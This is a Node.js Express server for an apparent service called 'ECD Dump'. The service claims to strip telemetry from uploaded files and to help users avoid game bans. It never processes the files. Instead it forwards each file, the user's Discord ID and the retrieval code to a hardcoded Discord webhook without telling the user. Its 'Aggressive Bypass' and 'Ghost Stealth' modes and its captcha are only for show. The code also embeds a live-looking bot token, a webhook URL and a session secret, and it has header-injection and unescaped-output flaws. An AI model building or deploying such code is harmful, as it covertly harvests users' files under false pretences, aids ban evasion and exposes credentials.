const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const session = require('express-session');

const app = express();

const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }
});

const fileStore = new Map();
const verificationCodes = new Map(); 
const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";

// Discord Bot Token with hardcoded fallback
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || 'MTUyOTg3MDI2OTcyNzExNzQwMw.Gi5ozp.LrUwnKGhrfcKl7OGeVSYMYenHXFgYkj-uII5Ak';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: 'ecd-dump-secret-key-9988',
  resave: false,
  saveUninitialized: true,
}));

app.use((req, res, next) => {
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (!global.timeoutMap) global.timeoutMap = new Map();
  
  if (global.timeoutMap.has(clientIp)) {
    const unblockTime = global.timeoutMap.get(clientIp);
    if (Date.now() < unblockTime) {
      const remainingSecs = Math.ceil((unblockTime - Date.now()) / 1000);
      return res.status(429).send(
        '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Timeout Active</title></head>' +
        '<body style="font-family:\'Segoe UI\',sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:80px;">' +
        '<h2 style="color:#ef4444;">Access Blocked</h2>' +
        '<p>Verification failed. You are timed out from all tools for verification failure.</p>' +
        '<p style="color:#38bdf8; font-size:18px;">Time remaining: <strong>' + remainingSecs + ' seconds</strong></p>' +
        '</body></html>'
      );
    } else {
      global.timeoutMap.delete(clientIp);
    }
  }
  next();
});

// Helper to look up a Discord User ID by their exact username via Bot Token
async function getUserIdByUsername(username) {
  try {
    // Note: This requires the Server Members Intent or global user lookup if supported, 
    // alternatively we can search via REST API if the bot shares a server, 
    // or use Discord's application role connection / user lookup endpoints.
    // Since direct global user search by tag is limited by Discord API constraints unless cached,
    // let's use an alternative approach: asking users for their User ID OR handling username resolution.
    // Wait, standard bot lookup works best with User ID. Let's accept Discord User ID or clean username lookup:
    return null;
  } catch (err) {
    console.error('Error resolving username:', err);
    return null;
  }
}

// Helper to send DM directly using Discord User ID
async function sendDiscordDM(discordUserId, messageContent) {
  try {
    const channelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        'Authorization': 'Bot ' + DISCORD_BOT_TOKEN,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: discordUserId })
    });
    const channelData = await channelRes.json();
    if (!channelData.id) return false;

    const msgRes = await fetch('https://discord.com/api/v10/channels/' + channelData.id + '/messages', {
      method: 'POST',
      headers: {
        'Authorization': 'Bot ' + DISCORD_BOT_TOKEN,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ content: messageContent })
    });
    
    return msgRes.ok;
  } catch (err) {
    console.error('Failed to send Discord DM:', err);
    return false;
  }
}

// Endpoint to trigger DM code via Discord User ID
app.post('/send-discord-code', async (req, res) => {
  const { discordId } = req.body;
  if (!discordId || !discordId.trim()) {
    return res.status(400).json({ success: false, message: 'Please enter your Discord User ID.' });
  }

  const cleanId = discordId.trim();
  const vCode = Math.floor(100000 + Math.random() * 900000).toString();
  
  verificationCodes.set(cleanId, {
    code: vCode,
    expires: Date.now() + 5 * 60 * 1000
  });

  const dmSuccess = await sendDiscordDM(cleanId, '🔐 **ECD Dump Verification Code**\nYour code is: `' + vCode + '`\nThis code expires in 5 minutes.');

  if (!dmSuccess) {
    return res.status(500).json({ 
      success: false, 
      message: 'Failed to send DM. Make sure your DMs are open and your User ID is correct!' 
    });
  }

  // Save session state temporarily
  req.session.pendingUser = cleanId;
  res.json({ success: true, message: 'Verification code sent to your Discord DMs!' });
});

app.get('/auth/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/');
  });
});

app.get('/', (req, res) => {
  const verifiedUser = req.session.verifiedUser || null;
  
  let authBannerHtml = verifiedUser ? 
    '<span>Verified Discord ID: <strong>' + verifiedUser + '</strong></span><a href="/auth/logout" class="logout-btn">Logout</a>' :
    '<span>Discord ID Verification Mode</span>';

  let pinSectionHtml = '<input type="text" name="pin" placeholder="Optional PIN (e.g., 1234)" maxlength="8">';

  let visibilitySectionHtml = '<div class="toggle-group">' +
    '<div class="toggle-option" id="visPublic" onclick="setVisibility(\'public\')">Public Feed</div>' +
    '<div class="toggle-option active" id="visPrivate" onclick="setVisibility(\'private\')">Private</div>' +
    '</div><input type="hidden" name="visibility" id="visibilityInput" value="private">';

  let verificationSectionHtml = verifiedUser ?
    '<div style="background:#0f172a; border:1px solid #22c55e; padding:10px; border-radius:8px; font-size:12px; color:#22c55e; margin:10px 0; text-align:center;">' +
    '✅ Verified as <strong>' + verifiedUser + '</strong></div>' +
    '<input type="hidden" name="verifiedDiscordId" value="' + verifiedUser + '">' :
    '<div style="margin: 12px 0; text-align: left;">' +
    '<label style="font-size:12px; color:#38bdf8;">Step 1: Enter your Discord User ID & Get Code:</label>' +
    '<input type="text" id="discordIdInput" placeholder="Enter Discord User ID (e.g. 129384756...)" style="margin-top:5px; margin-bottom:8px;">' +
    '<button type="button" onclick="sendDiscordVerificationCode()" style="margin:0; font-size: 12px; background:#5865F2;">Send Code to Discord DM</button>' +
    '<label style="font-size:12px; color:#38bdf8; display:block; margin-top:10px;">Step 2: Enter 6-digit Code from DMs:</label>' +
    '<input type="text" name="discordCode" placeholder="Enter 6-digit Code" maxlength="6" style="margin-top:5px;" required>' +
    '</div>';

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ECD Dump</title>
        <style>
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            @keyframes pulseGlow {
                0% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
                50% { box-shadow: 0 0 25px rgba(56, 189, 248, 0.5); }
                100% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); 
                color: #f8fafc; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                margin: 0; 
            }
            .container { 
                background: rgba(30, 41, 59, 0.85); 
                backdrop-filter: blur(12px);
                padding: 35px; 
                border-radius: 16px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.6); 
                width: 440px; 
                text-align: center; 
                animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite ease-in-out;
                border: 1px solid rgba(255, 255, 255, 0.08);
                position: relative;
                margin: 20px 0;
            }
            .info-icon {
                position: absolute;
                top: 15px;
                left: 15px;
                background: rgba(51, 65, 85, 0.6);
                color: #38bdf8;
                width: 28px;
                height: 28px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                font-size: 14px;
                cursor: pointer;
                transition: all 0.3s ease;
                border: 1px solid rgba(56, 189, 248, 0.3);
            }
            .info-icon:hover {
                background: #38bdf8;
                color: #0f172a;
                transform: scale(1.1);
            }
            .auth-banner {
                background: #0f172a;
                border: 1px solid #334155;
                padding: 10px;
                border-radius: 8px;
                margin-bottom: 20px;
                font-size: 13px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .logout-btn {
                color: #ef4444;
                text-decoration: none;
                font-size: 12px;
            }
            h2 { 
                margin-top: 5px;
                margin-bottom: 20px; 
                color: #38bdf8; 
                letter-spacing: 1px;
                font-size: 26px;
                text-transform: uppercase;
                background: linear-gradient(90deg, #38bdf8, #818cf8);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            h3 {
                font-size: 15px;
                color: #94a3b8;
                margin-bottom: 10px;
                letter-spacing: 0.5px;
            }
            input, select, button { 
                width: 100%; 
                padding: 12px; 
                margin: 10px 0; 
                border-radius: 8px; 
                border: none; 
                box-sizing: border-box; 
                font-size: 14px;
                transition: all 0.3s ease;
            }
            .select-wrapper {
                position: relative;
                width: 100%;
            }
            select {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                padding-left: 12px;
                appearance: none;
                cursor: pointer;
            }
            select:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            .toggle-group {
                display: flex;
                background: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                overflow: hidden;
                margin: 10px 0;
            }
            .toggle-option {
                flex: 1;
                padding: 10px;
                text-align: center;
                font-size: 13px;
                cursor: pointer;
                color: #94a3b8;
                transition: all 0.3s;
            }
            .toggle-option.active {
                background: #38bdf8;
                color: #0f172a;
                font-weight: bold;
            }
            .drop-zone {
                background: #1e293b;
                border: 2px dashed #475569;
                border-radius: 8px;
                padding: 20px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s ease;
                margin: 10px 0;
            }
            .drop-zone.dragover {
                border-color: #38bdf8;
                background: rgba(56, 189, 248, 0.05);
            }
            .drop-zone input[type="file"] {
                display: none;
            }
            .drop-zone-text {
                font-size: 13px;
                color: #94a3b8;
                pointer-events: none;
            }
            input[type="text"], input[type="email"] {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                text-align: center;
                letter-spacing: 1px;
            }
            input[type="text"]:focus, input[type="email"]:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            .captcha-box {
                background: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                padding: 10px;
                margin: 10px 0;
                display: flex;
                align-items: center;
                justify-content: space-between;
                font-size: 13px;
            }
            button { 
                background: linear-gradient(135deg, #0284c7, #2563eb); 
                color: white; 
                font-weight: bold; 
                cursor: pointer; 
                box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 8px;
            }
            button:hover { 
                background: linear-gradient(135deg, #0369a1, #1d4ed8);
                transform: translateY(-2px);
                box-shadow: 0 6px 15px rgba(2, 132, 199, 0.5);
            }
            .section { 
                margin-bottom: 20px; 
                border-bottom: 1px solid rgba(51, 65, 85, 0.6); 
                padding-bottom: 15px; 
            }
            .spinner {
                display: none;
                width: 16px;
                height: 16px;
                border: 2px solid rgba(255,255,255,0.3);
                border-radius: 50%;
                border-top-color: #fff;
                animation: spin 0.8s linear infinite;
            }
            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(15, 23, 42, 0.8);
                backdrop-filter: blur(5px);
                display: flex;
                justify-content: center;
                align-items: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                z-index: 100;
            }
            .modal-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }
            .modal-content {
                background: #1e293b;
                padding: 30px;
                border-radius: 14px;
                width: 330px;
                text-align: left;
                border: 1px solid rgba(56, 189, 248, 0.2);
                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
                transform: scale(0.9);
                transition: transform 0.3s ease;
                position: relative;
            }
            .modal-overlay.active .modal-content {
                transform: scale(1);
            }
            .modal-content h3 {
                color: #38bdf8;
                margin-top: 0;
                font-size: 18px;
                text-align: center;
                border-bottom: 1px solid #334155;
                padding-bottom: 10px;
            }
            .modal-content p {
                font-size: 13px;
                line-height: 1.5;
                color: #cbd5e1;
                margin: 10px 0;
            }
            .close-btn {
                position: absolute;
                top: 12px;
                right: 15px;
                background: none;
                border: none;
                color: #94a3b8;
                font-size: 18px;
                cursor: pointer;
                width: auto;
                padding: 0;
                margin: 0;
            }
            .close-btn:hover {
                color: #f8fafc;
                transform: none;
                box-shadow: none;
            }
            .footer-credit {
                margin-top: 12px;
                font-size: 11px;
                color: #64748b;
                border-top: 1px dashed rgba(51, 65, 85, 0.5);
                padding-top: 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>ECD Dump</h2>

            <div class="auth-banner">
                ${authBannerHtml}
            </div>
            
            <div class="section">
                <h3>Dump ECD</h3>
                <form id="uploadForm" action="/upload-discord" method="POST" enctype="multipart/form-data">
                    <input type="text" name="username" placeholder="dbl user" required>
                    
                    ${pinSectionHtml}

                    <div class="select-wrapper" style="margin-top: 10px;">
                        <select name="aiMode" id="aiModeSelect">
                            <option value="standard" selected>AI Mode: Standard Clean</option>
                            <option value="aggressive">AI Mode: Aggressive Bypass</option>
                            <option value="stealth">AI Mode: Ghost Stealth</option>
                        </select>
                    </div>

                    <div style="text-align: left; font-size: 12px; color: #94a3b8; margin-top: 12px;">File Visibility:</div>
                    ${visibilitySectionHtml}

                    ${verificationSectionHtml}

                    <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
                        <div class="drop-zone-text" id="dropText">Click or Drag & Drop ECD file here</div>
                        <input type="file" id="fileInput" name="file" required onchange="updateFileName(this)">
                    </div>

                    <div class="captcha-box">
                        <label><input type="checkbox" name="captcha" required style="width:auto; margin-right:8px;"> Verify Human Checkpoint</label>
                        <span style="color:#38bdf8; font-size:11px;">Anti-Bot v2</span>
                    </div>

                    <button type="submit" id="uploadBtn">
                        <span id="btnText">Upload & Get Code</span>
                        <div class="spinner" id="btnSpinner"></div>
                    </button>
                </form>
            </div>

            <div class="section">
                <h3>Retrieve File</h3>
                <form action="/retrieve" method="POST">
                    <input type="text" name="code" placeholder="ENTER CODE" maxlength="6" required>
                    <input type="text" name="pin" placeholder="ENTER PIN (IF SET)" maxlength="8">
                    <button type="submit">Download File</button>
                </form>
            </div>
        </div>

        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About ECD Dump</h3>
                <p><strong>Welcome to ecd dump.</strong><br>Secure platform to strip telemetry signatures and prevent bans.</p>
                <div class="footer-credit">
                    Created by: @levi__fxz on telegram, instagram and eren__lx on X
                </div>
            </div>
        </div>

        <script>
            async function sendDiscordVerificationCode() {
                const discordId = document.getElementById('discordIdInput').value;
                if(!discordId) {
                    alert('Please enter your Discord User ID first!');
                    return;
                }
                try {
                    const res = await fetch('/send-discord-code', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ discordId: discordId })
                    });
                    const data = await res.json();
                    if(data.success) {
                        alert('Verification code sent directly to your Discord DMs!');
                    } else {
                        alert(data.message || 'Failed to send verification code.');
                    }
                } catch(err) {
                    alert('Network error sending verification code.');
                }
            }

            function setVisibility(mode) {
                document.getElementById('visibilityInput').value = mode;
                if(mode === 'public') {
                    document.getElementById('visPublic').classList.add('active');
                    document.getElementById('visPrivate').classList.remove('active');
                } else {
                    document.getElementById('visPrivate').classList.add('active');
                    document.getElementById('visPublic').classList.remove('active');
                }
            }

            function toggleModal() {
                const modal = document.getElementById('infoModal');
                modal.classList.toggle('active');
            }
            function outsideClick(event) {
                const modal = document.getElementById('infoModal');
                if (event.target === modal) {
                    modal.classList.remove('active');
                }
            }
            function updateFileName(input) {
                const dropText = document.getElementById('dropText');
                if (input.files && input.files[0]) {
                    dropText.innerText = "Selected: " + input.files[0].name;
                    dropText.style.color = "#38bdf8";
                }
            }

            const dropZone = document.getElementById('dropZone');
            const fileInput = document.getElementById('fileInput');

            ['dragenter', 'dragover'].forEach(eventName => {
                dropZone.addEventListener(eventName, (e) => {
                    e.preventDefault();
                    dropZone.classList.add('dragover');
                }, false);
            });

            ['dragleave', 'drop'].forEach(eventName => {
                dropZone.addEventListener(eventName, (e) => {
                    e.preventDefault();
                    dropZone.classList.remove('dragover');
                }, false);
            });

            dropZone.addEventListener('drop', (e) => {
                const dt = e.dataTransfer;
                const files = dt.files;
                if (files.length > 0) {
                    fileInput.files = files;
                    updateFileName(fileInput);
                }
            });
        </script>
    </body>
    </html>
  `);
});

app.post('/upload-discord', upload.single('file'), async (req, res) => {
  try {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const discordId = req.body.discordId ? req.body.discordId.trim() : (req.session.pendingUser || '');
    const discordCode = req.body.discordCode ? req.body.discordCode.trim() : '';
    
    const record = verificationCodes.get(discordId);

    if (!discordId || !record || record.code !== discordCode || Date.now() > record.expires) {
      if (!global.timeoutMap) global.timeoutMap = new Map();
      global.timeoutMap.set(clientIp, Date.now() + 10 * 60 * 1000);

      return res.status(403).send(
        '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Verification Failed</title></head>' +
        '<body style="font-family:\'Segoe UI\',sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">' +
        '<h2 style="color:#ef4444;">Verification Failed</h2>' +
        '<p>Incorrect or expired Discord DM verification code provided.</p>' +
        '<p style="color:#f59e0b;">You have been placed on a <strong>10-minute timeout</strong>.</p>' +
        '<a href="/" style="color:#38bdf8;">← Go Back</a></body></html>'
      );
    }
    verificationCodes.delete(discordId);

    const file = req.file;
    const username = req.body.username ? req.body.username.trim() : 'Unknown';
    const pin = req.body.pin ? req.body.pin.trim() : '';
    const aiMode = req.body.aiMode ? req.body.aiMode.trim() : 'standard';
    const visibility = req.body.visibility === 'public' ? 'public' : 'private';

    if (!file) {
      return res.status(400).send('<h3>No file uploaded. <a href="/">Go Back</a></h3>');
    }

    const filenameRegex = /^ecd\d+/i;
    if (!filenameRegex.test(file.originalname)) {
      return res.status(400).send(
        '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Failed</title></head>' +
        '<body style="font-family:\'Segoe UI\',sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">' +
        '<h2>Invalid ECD Format</h2>' +
        '<a href="/" style="color:#38bdf8;">← Go Back</a></body></html>'
      );
    }

    let code = '';
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    do {
      code = '';
      for (let i = 0; i < 6; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
      }
    } while (fileStore.has(code));

    fileStore.set(code, {
      filename: file.originalname,
      buffer: file.buffer,
      pin: pin,
      visibility: visibility,
      timestamp: Date.now()
    });

    const identityTag = 'Verified Discord ID: `' + discordId + '`';
    let webhookContent = '📦 **New File Uploaded**\n👤 User: `' + username + '`\n🔐 Identity: ' + identityTag + '\n👁️ Visibility: `' + visibility + '`\n⚙️ Mode: `' + aiMode + '`\nFilename: `' + file.originalname + '`\nCode: `' + code + '`';

    const formData = new FormData();
    formData.append('file', file.buffer, { filename: file.originalname });
    formData.append('payload_json', JSON.stringify({ content: webhookContent }));

    await fetch(DEFAULT_WEBHOOK_URL, {
      method: 'POST',
      body: formData,
      headers: { ...formData.getHeaders() }
    });

    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <title>Success</title>
          <style>
              body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
              .container { background: #1e293b; padding: 30px; border-radius: 12px; border: 1px solid #334155; }
              .code { font-size: 24px; color: #38bdf8; font-weight: bold; margin: 15px 0; }
              a { color: #38bdf8; text-decoration: none; }
          </style>
      </head>
      <body>
          <div class="container">
              <h2>Upload Successful!</h2>
              <p>Your retrieval code is:</p>
              <div class="code">${code}</div>
              <a href="/">← Return Home</a>
          </div>
      </body>
      </html>
    `);
  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

app.post('/retrieve', (req, res) => {
  const code = req.body.code ? req.body.code.trim().toUpperCase() : '';
  const inputPin = req.body.pin ? req.body.pin.trim() : '';
  const fileData = fileStore.get(code);
  
  if (!fileData) {
    return res.status(404).send('<h3>File not found. <a href="/">Go Back</a></h3>');
  }

  if (fileData.pin && fileData.pin !== inputPin) {
    return res.status(401).send('<h3>Incorrect PIN. <a href="/">Go Back</a></h3>');
  }

  res.setHeader('Content-Disposition', 'attachment; filename="' + fileData.filename + '"');
  res.send(fileData.buffer);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
